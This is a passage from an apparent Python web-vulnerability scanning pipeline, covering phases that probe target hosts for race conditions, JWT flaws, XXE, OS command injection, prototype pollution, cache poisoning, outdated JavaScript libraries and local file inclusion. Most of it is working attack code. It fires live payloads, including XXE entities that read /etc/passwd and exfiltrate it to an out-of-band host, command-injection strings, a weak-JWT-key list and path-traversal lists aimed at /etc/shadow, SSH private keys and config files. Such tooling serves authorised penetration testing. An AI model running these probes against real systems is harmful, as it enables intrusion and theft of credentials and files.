        log("warn", "23-RACE: no state-changing endpoints found; skipping")
        return {"23-RACE": str(_out), "count": 0}
    async def _race_test(url: str) -> List[str]:
        results: List[str] = []
        # Sequential baseline: single request to measure natural variance
        try:
            base_req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
            _, _, base_body = await _async_urlopen(_r_urlopen, base_req, timeout=10)
            baseline_len = len(base_body)
        except Exception:
            return results
        # Concurrent burst: 5 simultaneous requests
        responses: List[int] = []
        body_lens: List[int] = []
        async def _concurrent_req() -> None:
            async with _race_sem:
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                    s, _, b = await _async_urlopen(_r_urlopen, req, timeout=10)
                    responses.append(s)
                    body_lens.append(len(b))
                except Exception:
                    responses.append(0)
                    body_lens.append(0)
        coros = [_concurrent_req() for _ in range(5)]
        await asyncio.gather(*coros)
        unique_st = len(set(responses))
        unique_len = len(set(body_lens))
        all_differ_from_baseline = all(abs(bl - baseline_len) > 200 for bl in body_lens)
        if unique_st > 1 or (unique_len > 1 and all_differ_from_baseline):
            results.append(f"[race-candidate] {url} baseline_len={baseline_len} statuses={set(responses)} lengths={set(body_lens)}")
        return results
    race_results = await asyncio.gather(*[_race_test(t) for t in targets])
    for rr in race_results:
        findings.extend(rr)
    # Multi-step TOCTOU: fire read+together concurrently
    async def _toctou_test(url: str) -> List[str]:
        results: List[str] = []
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                return results
            first_param = next(iter(qs))
            orig_val = qs[first_param][0]
            test_val = orig_val + "_race_test"
            write_qs = qs.copy()
            write_qs[first_param] = [test_val]
            write_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(write_qs, doseq=True)))
            read_qs = qs.copy()
            read_qs[first_param] = [orig_val]
            read_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(read_qs, doseq=True)))
            async def _write_first() -> None:
                async with _race_sem:
                    try:
                        w_req = urllib.request.Request(write_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                        await _async_urlopen(_r_urlopen, w_req, timeout=10)
                    except Exception:
                        pass
            async def _read_first() -> Tuple[Optional[int], int]:
                async with _race_sem:
                    try:
                        r_req = urllib.request.Request(read_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                        rs, _, rb = await _async_urlopen(_r_urlopen, r_req, timeout=10)
                        return rs, len(rb)
                    except Exception:
                        return None, 0
            write_task = asyncio.create_task(_write_first())
            read_tasks = [_read_first() for _ in range(3)]
            read_results = await asyncio.gather(*read_tasks)
            await write_task
            statuses = {r[0] for r in read_results if r[0] is not None}
            lengths = {r[1] for r in read_results}
            if len(statuses) > 1 or (len(lengths) > 1 and max(lengths) - min(lengths) > 200):
                results.append(f"[toctou-candidate] {url} concurrent write+read statuses={statuses} lengths={lengths}")
        except Exception:
            pass
        return results
    toctou_results = await asyncio.gather(*[_toctou_test(t) for t in targets[:_PIPELINE_CFG.sample_endpoints_race // 2]])
    for tr in toctou_results:
        findings.extend(tr)
    if not findings:
        findings.append("[race] No race condition candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"23-RACE: {len(findings)} race condition probes → {out}")
    return {"23-RACE": str(out), "count": len(findings)}


# ────────────────── Phase 24-JWT: JWT Attack Surface ───────────────────────────
_JWT_NONE_PAYLOADS = [
    "eyJhbGciOiJub25lIn0",
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0",
]
_JWT_WEAK_KEYS = ["secret", "password", "12345", "key", "admin", "changeme", "secretkey", "jwt_secret"]


async def phase_24_JWT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"24-JWT"}:
        return {}
    _out = outdir / "jwt_analysis.txt"
    if _out.exists() and not force:
        return {"24-JWT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 24-JWT: JWT token analysis")
    findings: List[str] = []
    _j_urlopen = _get_urlopener()
    _jwt_extra_headers = _extra_headers_dict()
    # Collect HTTP targets and probe for JWTs
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h
               for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_jwt]
    if not targets:
        log("warn", "24-JWT: no HTTP targets; skipping")
        return {"24-JWT": str(_out), "count": 0}
    # Probe for JWTs in Authorization headers, cookies, and response bodies
    async def _probe_jwt(url: str) -> List[str]:
        results: List[str] = []
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_jwt_extra_headers})
            _, headers, body_bytes = await _async_urlopen(_j_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            all_text = body + " " + " ".join(f"{k}:{v}" for k, v in headers.items())
            for m in re.finditer(r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", all_text):
                token = m.group()
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    header_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
                    payload_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
                    header = json.loads(base64.urlsafe_b64decode(header_b64))
                    payload = json.loads(base64.urlsafe_b64decode(payload_b64))
                    alg = header.get("alg", "unknown")
                    results.append(f"[jwt-found] {url} alg={alg} payload={json.dumps(payload, default=str)[:200]}")
                    if alg == "none":
                        results.append(f"[jwt-critical] alg=none detected on {url}")
                    if "kid" in header:
                        kid_val = header["kid"]
                        results.append(f"[jwt-kid] kid={kid_val} on {url} — possible KID injection")
                        if "/" in kid_val or ".." in kid_val:
                            results.append(f"[jwt-kid-path-traversal] kid={kid_val} contains path traversal chars")
                    if "jku" in header:
                        jku_val = header["jku"]
                        results.append(f"[jwt-jku] jku={jku_val} on {url} — check for JKU SSRF")
                        if "evil" in jku_val.lower() or not jku_val.startswith("https"):
                            results.append(f"[jwt-jku-suspicious] jku URL may be attacker-controllable: {jku_val}")
                    if "jwk" in header:
                        results.append(f"[jwt-jwk-embedded] jwk present in header on {url} — embedded JWK may be attacker-controlled")
                    if "typ" in header and header["typ"] == "JWT":
                        pass
                    if alg and alg != "none" and alg != "RS256":
                        results.append(f"[jwt-unusual-alg] alg={alg} on {url}")
                    for weak_key in _JWT_WEAK_KEYS:
                        try:
                            import hmac as _hmac
                            sig_b64 = parts[2] + "=" * ((4 - len(parts[2]) % 4) % 4)
                            sig = base64.urlsafe_b64decode(sig_b64)
                            expected = _hmac.new(weak_key.encode(), (parts[0] + "." + parts[1]).encode(), "sha256").digest()
                            if _hmac.compare_digest(sig, expected):
                                results.append(f"[jwt-weak-hmac] token signed with weak key '{weak_key}' on {url}")
                                break
                        except Exception:
                            continue
                    if alg == "RS256":
                        try:
                            import hmac as _hmac
                            _hmac.new(b"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC", (parts[0] + "." + parts[1]).encode(), "sha256").digest()
                            results.append(f"[jwt-alg-confusion-test] try RS256→HS256 with public key as HMAC secret on {url}")
                        except Exception:
                            pass
                except Exception:
                    continue
        except Exception:
            pass
        return results
    jwt_results = await asyncio.gather(*[_probe_jwt(t) for t in targets])
    for jr in jwt_results:
        findings.extend(jr)
    if not findings:
        findings.append("[jwt] No JWT tokens found in initial probes")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"24-JWT: {len(findings)} JWT analysis findings → {out}")
    return {"24-JWT": str(out), "count": len(findings)}


# ────────────────── Phase 25-XXE: XML External Entity Injection ────────────────
async def phase_25_XXE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], oast_domain: Optional[str], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"25-XXE"}:
        return {}
    _out = outdir / "xxe.txt"
    if _out.exists() and not force:
        return {"25-XXE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 25-XXE: XML external entity injection probes")
    findings: List[str] = []
    _x_urlopen = _get_urlopener()
    _xxe_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "25-XXE: no URLs; skipping")
        return {"25-XXE": str(_out), "count": 0}
    targets = [u.split("?")[0] for u in all_urls][:_PIPELINE_CFG.sample_urls_xxe]
    oast_ref = oast_domain or "burpcollaborator.net"
    _xxe_p1 = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'''
    _xxe_p2 = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>'''
    _xxe_p3 = f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "http://{oast_ref}/xxe-oob"> %test;]><root/>'''
    _xxe_p4 = f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oast_ref}/xxe?data=%file;'>">%eval;%exfil;]><root/>'''
    xxe_payloads = [_xxe_p1, _xxe_p2, _xxe_p3, _xxe_p4]
    async def _probe_xxe(url: str) -> List[str]:
        results: List[str] = []
        for i, payload in enumerate(xxe_payloads):
            try:
                req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST",
                    headers={"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0", **_xxe_extra_headers})
                xs, _, xb = await _async_urlopen(_x_urlopen, req, timeout=10)
                body = xb.decode("utf-8", errors="ignore")
                if "root" in body and ("root" in body[:100] or xs in (200, 201)):
                    results.append(f"[xxe-candidate] {url} payload={i} HTTP {xs}")
                    break
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode("utf-8", errors="ignore")
                    if "root" in body or "file" in body.lower():
                        results.append(f"[xxe-error-reflected] {url} payload={i} HTTP {e.code}")
                        break
                except Exception:
                    continue
            except Exception:
                continue
        return results
    xxe_results = await asyncio.gather(*[_probe_xxe(t) for t in targets])
    for xr in xxe_results:
        findings.extend(xr)
    if not findings:
        findings.append("[xxe] No XXE candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"25-XXE: {len(findings)} XXE probe findings → {out}")
    return {"25-XXE": str(out), "count": len(findings)}


# ────────────────── Phase 26-CMDINJECT: Command Injection ──────────────────────
_CMDI_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; uname -a",
    "| whoami",
    "; ping -c 1 127.0.0.1",
    "| nslookup example.com",
    "& echo ${PATH}",
]
_CMDI_PARAMS = {"host", "ping", "domain", "server", "ip", "target", "url", "path", "cmd", "command", "exec", "shell", "dir", "folder", "file"}


async def phase_26_CMDINJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"26-CMDINJECT"}:
        return {}
    _out = outdir / "cmd_injection.txt"
    if _out.exists() and not force:
        return {"26-CMDINJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 26-CMDINJECT: OS command injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "26-CMDINJECT: no URLs; skipping")
        return {"26-CMDINJECT": str(_out), "count": 0}
    findings: List[str] = []
    _c_urlopen = _get_urlopener()
    _cmdi_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_cmdi]
    if t.has("commix") and param_urls:
        commix_outdir = outdir / "logs" / "commix"
        commix_outdir.mkdir(parents=True, exist_ok=True)
        for u in param_urls:
            runner = outdir / "logs" / f"commix_{_safe_name(u)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(u)}\n"
                f"OUT={shlex.quote(str(commix_outdir))}\n"
                'commix -u "$URL" --batch --output-dir="$OUT" < /dev/null\n'
            )
            runner.chmod(0o700)
            await _run(
                f"commix-{_safe_name(u)}",
                ["bash", str(runner)],
                600, outdir,
            )
        commix_reports = list(commix_outdir.glob("**/*.txt"))
        if commix_reports:
            findings.append(f"[commix] {len(commix_reports)} report files → {commix_outdir}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in _CMDI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _CMDI_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_cmdi_extra_headers})
                    _, _, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    indicators = ["uid=", "gid=", "groups=", "linux", "darwin", "www-data", "root:", "bin/",
                                  "microsoft", "windows", "nt authority", "command not found", "not recognized"]
                    if any(ind in body.lower() for ind in indicators):
                        findings.append(f"[cmdi-candidate] {test_url} param={param_name} payload={payload}")
                        break
                except Exception:
                    continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"26-CMDINJECT: {len(findings)} command injection probes → {out}")
    return {"26-CMDINJECT": str(out), "count": len(findings)}


# ────────────────── Phase 27-SSPP: Server-Side Prototype Pollution ─────────────
async def phase_27_SSPP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"27-SSPP"}:
        return {}
    _out = outdir / "sspp.txt"
    if _out.exists() and not force:
        return {"27-SSPP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 27-SSPP: server-side prototype pollution probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "27-SSPP: no URLs; skipping")
        return {"27-SSPP": str(_out), "count": 0}
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _sspp_extra_headers = _extra_headers_dict()
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower()][:_PIPELINE_CFG.sample_endpoints_sspp]
    sspp_payloads = [
        {"__proto__": {"admin": True}},
        {"__proto__": {"is_admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"status": "active"}},
    ]
    for u in api_targets:
        for payload in sspp_payloads:
            try:
                body_data = json.dumps(payload).encode()
                req = urllib.request.Request(u, data=body_data, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", **_sspp_extra_headers})
                ss, _, sb = await _async_urlopen(_s_urlopen, req, timeout=10)
                if ss in (200, 201, 302):
                    findings.append(f"[sspp-candidate] POST {u} payload={json.dumps(payload)} → HTTP {ss}")
            except urllib.error.HTTPError as e:
                if 500 <= e.code < 600:
                    findings.append(f"[sspp-crash-candidate] POST {u} payload={json.dumps(payload)} → HTTP {e.code}")
            except Exception:
                continue
    if not findings:
        findings.append("[sspp] No prototype pollution candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"27-SSPP: {len(findings)} prototype pollution probes → {out}")
    return {"27-SSPP": str(out), "count": len(findings)}


# ────────────────── Phase 28-CACHED: Web Cache Poisoning ───────────────────────
_CACHE_POISON_HEADERS = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Scheme", "X-Original-URL", "X-Rewrite-URL"]
_CACHE_KEY_DISCLOSURE_HEADERS = ["Pragma: x-get-cache-key", "X-Cache-Key", "X-Cache-Path", "X-Cache-Params"]


async def phase_28_CACHED(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"28-CACHED"}:
        return {}
    _out = outdir / "cache_poison.txt"
    if _out.exists() and not force:
        return {"28-CACHED": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 28-CACHED: web cache poisoning/deception probes")
    findings: List[str] = []
    cp_urlopen = _get_urlopener()
    _cp_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h
               for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_cached]
    if not targets:
        log("warn", "28-CACHED: no HTTP targets; skipping")
        return {"28-CACHED": str(_out), "count": 0}
    async def _probe_cached(url: str) -> List[str]:
        results: List[str] = []
        try:
            base_req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
            base_status, base_headers, base_body = await _async_urlopen(cp_urlopen, base_req, timeout=10)
            base_cached = "x-cache" in str(base_headers).lower() or "age:" in str(base_headers).lower() or "cf-cache" in str(base_headers).lower()
            if not base_cached:
                return results
            results.append(f"[cache-detected] {url} — caching headers present")
            for hdr in _CACHE_POISON_HEADERS:
                try:
                    poison_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", hdr: "evil.example.com", **_cp_extra_headers})
                    p_status, p_headers, p_body = await _async_urlopen(cp_urlopen, poison_req, timeout=10)
                    p_str = str(p_headers).lower()
                    if "evil.example.com" in p_str:
                        results.append(f"[cache-poison-candidate] {url} via {hdr}: evil.example.com reflected in headers")
                        break
                except Exception:
                    continue
            for dhdr in _CACHE_KEY_DISCLOSURE_HEADERS:
                try:
                    d_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", dhdr: "1", **_cp_extra_headers})
                    _, d_headers, d_body = await _async_urlopen(cp_urlopen, d_req, timeout=10)
                    d_str = str(d_headers).lower() + d_body.decode("utf-8", errors="ignore").lower()
                    if "cache-key" in d_str:
                        results.append(f"[cache-key-disclosure] {url} via {dhdr}")
                except Exception:
                    continue
            # X-Original-URL / X-Rewrite-URL / X-HTTP-Method-Override
            for alt_hdr in ["X-Original-URL", "X-Rewrite-URL", "X-HTTP-Method-Override"]:
                try:
                    alt_req = urllib.request.Request(url + "/nonexistent-cache-test", method="GET",
                        headers={"User-Agent": "Mozilla/5.0", alt_hdr: "/admin", **_cp_extra_headers})
                    _, alt_headers, _ = await _async_urlopen(cp_urlopen, alt_req, timeout=10)
                    if "x-cache" in str(alt_headers).lower() or "age:" in str(alt_headers).lower():
                        results.append(f"[cache-deception-candidate] {url} via {alt_hdr}: /admin")
                except Exception:
                    pass
            # Web Cache Deception: append static extensions
            base_body_lower = base_body.decode("utf-8", errors="ignore").lower() if base_body else ""
            for ext in [".css", ".js", ".png"]:
                try:
                    wcd_url = url.rstrip("/") + ext
                    wcd_req = urllib.request.Request(wcd_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                    _, wcd_headers, wcd_body = await _async_urlopen(cp_urlopen, wcd_req, timeout=10)
                    wcd_str = str(wcd_headers).lower()
                    if ("x-cache" in wcd_str or "age:" in wcd_str) and wcd_body:
                        wcd_body_lower = wcd_body.decode("utf-8", errors="ignore").lower()
                        if base_body_lower and wcd_body_lower and len(wcd_body_lower) > 50 and \
                           (wcd_body_lower.find("<!doctype") >= 0 or wcd_body_lower.find("<html") >= 0):
                            results.append(f"[wcd-candidate] {url}{ext} — static extension trick returns user data")
                except Exception:
                    continue
            # Cache key confusion: double-encoded params
            parsed = urllib.parse.urlparse(url)
            qs = parsed.query
            try:
                if qs:
                    double_enc_qs = urllib.parse.quote(qs)
                    conf_url = urllib.parse.urlunparse(parsed._replace(query=double_enc_qs))
                    conf_req = urllib.request.Request(conf_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                    _, conf_headers, conf_body = await _async_urlopen(cp_urlopen, conf_req, timeout=10)
                    if conf_body != base_body:
                        results.append(f"[cache-key-confusion] {url} — double-encoded param produces different response")
            except Exception:
                pass
            try:
                if qs:
                    semi_qs = qs.replace("&", ";")
                    semi_url = urllib.parse.urlunparse(parsed._replace(query=semi_qs))
                    semi_req = urllib.request.Request(semi_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                    _, semi_headers, semi_body = await _async_urlopen(cp_urlopen, semi_req, timeout=10)
                    if semi_body != base_body:
                        results.append(f"[cache-key-confusion] {url} — semicolons produce different cache key")
            except Exception:
                pass
            try:
                post_req = urllib.request.Request(url, method="POST", data=b"",
                    headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                po_status, po_headers, po_body = await _async_urlopen(cp_urlopen, post_req, timeout=10)
                if po_body == base_body and "x-cache" in str(po_headers).lower():
                    results.append(f"[cache-key-confusion] {url} — POST request produces same cache as GET")
            except Exception:
                pass
            # Mergeable params
            try:
                if qs:
                    parsed_qs = urllib.parse.parse_qs(qs, keep_blank_values=True)
                    if parsed_qs:
                        fst_key = next(iter(parsed_qs))
                        merge_qs = urllib.parse.urlencode({fst_key: ["1", "2"]}, doseq=True)
                        merge_url = urllib.parse.urlunparse(parsed._replace(query=merge_qs))
                        merge_req = urllib.request.Request(merge_url, method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                        _, merge_headers, merge_body = await _async_urlopen(cp_urlopen, merge_req, timeout=10)
                        if merge_body != base_body:
                            results.append(f"[mergeable-params] {url} — param merging causes different response")
            except Exception:
                pass
            # Chunked encoding + cache
            try:
                chunked_req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", "Transfer-Encoding": "chunked", "Content-Length": "0", **_cp_extra_headers})
                _, chunked_headers, _ = await _async_urlopen(cp_urlopen, chunked_req, timeout=10)
                if "x-cache" in str(chunked_headers).lower():
                    results.append(f"[chunked-cache] {url} — chunked encoding with Content-Length returns cached response")
            except Exception:
                pass
            # Cache TTL fingerprint
            try:
                ttl_req1 = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                _, ttl_h1, _ = await _async_urlopen(cp_urlopen, ttl_req1, timeout=10)
                await asyncio.sleep(1)
                ttl_req2 = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
                _, ttl_h2, _ = await _async_urlopen(cp_urlopen, ttl_req2, timeout=10)
                age1 = ttl_h1.get("Age")
                age2 = ttl_h2.get("Age")
                if age1 is not None and age2 is not None:
                    try:
                        age_diff = int(age2) - int(age1)
                        if age_diff >= 0:
                            results.append(f"[cache-ttl] {url} — TTL ~{age_diff}s based on Age vs Date")
                    except (ValueError, TypeError):
                        pass
            except Exception:
                pass
        except Exception:
            pass
        return results
    cp_results = await asyncio.gather(*[_probe_cached(t) for t in targets])
    for cr in cp_results:
        findings.extend(cr)
    if not findings:
        findings.append("[cached] No cache poisoning candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"28-CACHED: {len(findings)} cache probes → {out}")
    return {"28-CACHED": str(out), "count": len(findings)}


# ────────────────── Phase 29-DEPCHECK: JS Dependency Vuln Check ────────────────
_DEP_CHECK_PATTERNS: List[Tuple[str, str, str, str]] = [
    ("jquery", r"jquery[.-]?([\d.]+)", "3.5.0", "CVE-2020-11023+ (XSS via HTML parsing)"),
    ("angular", r"angular[.-]?([\d.]+)", "1.8.0", "CVE-2022-25869 (XSS)"),
    ("react", r"react[.-]?([\d.]+)", "16.14.0", "CVE-2023-XXXX (various)"),
    ("lodash", r"lodash[.-]?([\d.]+)", "4.17.21", "CVE-2021-23337 (prototype pollution)"),
    ("vue", r"vue[.-]?([\d.]+)", "2.7.0", "CVE-2023-XXXX (XSS)"),
    ("moment", r"moment[.-]?([\d.]+)", "2.29.4", "CVE-2022-24785 (ReDoS)"),
    ("bootstrap", r"bootstrap[.-]?([\d.]+)", "4.6.2", "CVE-2020-11023 (XSS)"),
    ("express", r"express[.-]?([\d.]+)", "4.18.2", "CVE-2022-24999 (qs prototype pollution)"),
]


def _parse_semver(ver: str) -> Optional[Tuple[int, int, int]]:
    parts = ver.split(".")
    if len(parts) >= 3 and all(p.isdigit() for p in parts[:3]):
        return (int(parts[0]), int(parts[1]), int(parts[2]))
    if len(parts) >= 2 and all(p.isdigit() for p in parts[:2]):
        return (int(parts[0]), int(parts[1]), 0)
    return None


def _semver_lt(v1: Tuple[int, int, int], v2: Tuple[int, int, int]) -> bool:
    return v1 < v2


async def phase_29_DEPCHECK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"29-DEPCHECK"}:
        return {}
    _out = outdir / "depcheck.txt"
    if _out.exists() and not force:
        return {"29-DEPCHECK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 29-DEPCHECK: JS dependency vulnerability scanning")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _dc_extra_headers = _extra_headers_dict()
    js_urls = outdir / "urls_js.txt"
    all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        await asyncio.sleep(3)
        all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        log("warn", "29-DEPCHECK: no JS URLs; skipping")
        return {"29-DEPCHECK": str(_out), "count": 0}
    scanned = 0
    seen_deps: Set[str] = set()
    for js_url in all_js[:_PIPELINE_CFG.sample_urls_depcheck]:
        try:
            req = urllib.request.Request(js_url, headers={"User-Agent": "Mozilla/5.0", **_dc_extra_headers})
            _, _, body_bytes = await _async_urlopen(_d_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
            scanned += 1
            for dep_name, pattern, safe_ver_str, advisory in _DEP_CHECK_PATTERNS:
                for m in re.finditer(pattern, body, re.IGNORECASE):
                    ver = m.group(1)
                    cache_key = f"{dep_name}@{ver}"
                    if cache_key in seen_deps:
                        continue
                    seen_deps.add(cache_key)
                    parsed = _parse_semver(ver)
                    safe_ver = _parse_semver(safe_ver_str)
                    if parsed and safe_ver and _semver_lt(parsed, safe_ver):
                        findings.append(f"[outdated] {dep_name} v{ver} in {js_url} — {advisory}")
                    else:
                        findings.append(f"[dep] {dep_name} v{ver} in {js_url} (current)")
        except Exception:
            continue
    findings.append(f"[depcheck] scanned {scanned} JS files, {len(seen_deps)} unique dependencies found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"29-DEPCHECK: {len(findings)} dependency findings → {out}")
    return {"29-DEPCHECK": str(out), "count": len(findings)}


async def phase_30_LFI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"30-LFI"}:
        return {}
    _out = outdir / "lfi.txt"
    if _out.exists() and not force:
        return {"30-LFI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 30-LFI: path traversal / local file inclusion probes")
    findings: List[str] = []
    _lfi_urlopen = _get_urlopener()
    _lfi_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "30-LFI: no URLs; skipping")
        return {"30-LFI": str(_out), "count": 0}
    # Identify file-read parameters
    file_params = ["file", "page", "template", "include", "path", "doc", "document",
                   "folder", "root", "load", "read", "dir", "show", "view",
                   "content", "editor", "preview", "resource", "config",
                   "language", "lang", "style", "template", "plugin"]
    param_urls = [
        u for u in all_urls
        if "=" in u and not _is_static_url(u) and any(f"{p}=" in u.lower() for p in file_params)
    ]
    if not param_urls:
        param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    param_urls = param_urls[:_PIPELINE_CFG.sample_urls_lfi]
    if not param_urls:
        log("warn", "30-LFI: no parameter-bearing URLs; skipping")
        return {"30-LFI": str(_out), "count": 0}
    findings.append(f"target_urls={len(param_urls)}")
    lfi_payloads = [
        "/etc/passwd",
        "/etc/passwd%00",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../windows/win.ini",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/var/log/apache/access.log",
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access.log",
        "/etc/issue",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/etc/ssh/sshd_config",
        "/root/.bash_history",
        "/home/ubuntu/.bash_history",
        "/home/admin/.ssh/id_rsa",
        "/home/ubuntu/.ssh/authorized_keys",
        "/var/www/html/config.php",
        "/var/www/config.php",
        "/var/www/application/config/database.php",
        "/web.config",
        "/WEB-INF/web.xml",
        "/WEB-INF/db.properties",
    ]
    lfi_indicators = [
        "root:", "root:x:", "daemon:", "bin:", "sys:", "nobody:",
        "[extensions]", "[fonts]", "load average", "uptime",
        "www-data", "wwwrun", "localhost", "nameserver",
        "ssh-rsa", "ssh-dss", "BEGIN RSA PRIVATE KEY",
